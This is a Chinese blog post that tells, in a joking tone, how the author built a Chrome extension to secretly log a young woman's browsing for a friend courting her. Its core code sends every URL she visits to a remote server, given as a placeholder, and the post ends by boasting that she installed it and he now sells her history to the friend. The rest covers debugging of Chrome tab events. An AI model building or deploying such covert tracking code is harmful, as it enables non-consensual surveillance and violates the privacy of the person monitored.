---
title: 用Chrome插件监听你的浏览器操作
date: 2017-03-15 08:57:52
tags: [插件,chrome]
---



＃写在前面

前几天接到武阳电话，这丫给我打电话，一定没有好事。果然……

武阳正在追一90后萌妹子，80后大叔追一90后妹子，有代沟，不知道如何下手。丫的一动歪脑子，想让我帮监控妹子上网行踪，看看妹子都爱看那些话题，说约妹子时有话聊～。切～～

对于这种无理请求，我一般是直接拉黑的。

"我不就认识你，还是搞电脑的的么"。

"我都30好几的人了，找不到老婆你负责啊"。

"好不容易遇到一喜欢的，你要不帮我，不还你钱了"。

死缠乱打，外加威胁，还有各种信息骚扰。我妥协了。

"最后一次帮你，重申一次，我不是搞电脑的，我是一名程序员，请你丫尊重我的职业"，我恶狠狠的对武阳说。

<!-- more --> 

# 最终效果
拿到上网记录输出日志，如下图

![上网记录](/images/20170315_git_3.png "上网记录")

# 核心代码

这个扩展最核心的就是background.js，几行代码搞定。如下：

```
chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab){
    //console.log(changeInfo);
    //console.log(tab);
    if( changeInfo.url == undefined) return;//解决onUpdated多次运行的问题
    var url = tab.url;
    if(url != undefined) {
        // 将信息能过Ajax发送到服务器
        $.ajax({
            url: 'http://xxx.xxx/xxx/xxx',
            type: 'POST',
            data: {'url': tab.url},
            //dataType: 'json',
        }).done(function(msg){
            console.log(msg);
        }, function(e){
            console.log(e);
        });
    }
    
})

```

＃遇到的问题

在使用chrome.tabs.onUpdated.addListener拦截url时，遇到了onUpdate事件多次运行的问题，debug了一下，发现在tab更新url的时候，会有下面的四种情况

```json
//第一种 访问url，触发事件，loading
changeInfo = {status: "loading", url: "http://fxd.blogchina.com/790583846.html"} 
tab =  {
    active:true
    audible:false
    autoDiscardable:true
    discarded:false
    height:636
    highlighted:true
    id:5465
    incognito:false
    index:7
    mutedInfo:Object
    openerTabId:5101
    pinned:false
    selected:true
    status:"loading"
    title:"fxd.blogchina.com/790583846.html"
    url:"http://fxd.blogchina.com/790583846.html"
    width:1225
    windowId:1
}
 
//第二种 访问title，触发事件 loading
changeInfo  = {title:"凯文·凯利为什么在中国独热而在硅谷从来不热？-方兴东的专栏 - 博客中国"} 
tab =  {
    active:true
    audible:false
    autoDiscardable:true
    discarded:false
    height:636
    highlighted:true
    id:5465
    incognito:false
    index:7
    mutedInfo:Object
    openerTabId:5101
    pinned:false
    selected:true
    status:"loading"
    title:"凯文·凯利为什么在中国独热而在硅谷从来不热？-方兴东的专栏 - 博客中国"
    url:"http://fxd.blogchina.com/790583846.html"
    width:1225
    windowId:1
}
 
//第三种 访问url结束，触发事件，complete
changeInfo =  {status: "complete"} 
tab = {
    active:true
    audible:false
    autoDiscardable:true
    discarded:false
    height:636
    highlighted:true
    id:5465
    incognito:false
    index:7
    mutedInfo:Object
    openerTabId:5101
    pinned:false
    selected:true
    status:"complete"
    title:"凯文·凯利为什么在中国独热而在硅谷从来不热？-方兴东的专栏 - 博客中国"
    url:"http://fxd.blogchina.com/790583846.html"
    width:1225
    windowId:1
}

//第四种 favIcon，触发事件，complete
changeInfo =  {favIconUrl:"http://fxd.blogchina.com/favicon.ico"} 
tab = {
    active:true
    audible:false
    autoDiscardable:true
    discarded:false
    favIconUrl:"http://fxd.blogchina.com/favicon.ico"
    height:636
    highlighted:true
    id:5465
    incognito:false
    index:7
    mutedInfo:Object
    openerTabId:5101
    pinned:false
    selected:true
    status:"complete"
    title:"凯文·凯利为什么在中国独热而在硅谷从来不热？-方兴东的专栏 - 博客中国"
    url:"http://fxd.blogchina.com/790583846.html"
    width:1225
    windowId:1
}


```

＃总结

总结以上四种情况：在tab更新url时

1、访问url，触发事件，loading
2、访问title，触发事件，loading
3、访问favicon，触发事件，complete
4、访问url结束，触发事件，complete

通过查看，我们可以发现，只有一次在访问url的时候，changeInfo会有url这个字段，所以可以利用这个字段来判断，让onUpdate里面的代码对每个url只运行一次，如下：


```javascript
chrome.tabs.onUpdated.addListener(function(tabId, changeInfo,tab) {
    if( changeInfo.url == undefined) {
        return;
    }
    var url = tab.url;
    
    if(url != undefined) {
        // do something
    }
});

```

＃后记

代码写完，妹子顺利安装后，武阳不但乖乖还钱了，还发了我很多红包。一向嚣张的武阳变乖了吗？不是，因为我掌握着妹子的上网记录～，心情好时我会把记录推给武阳，心情不好时，有红包心情就好喽。







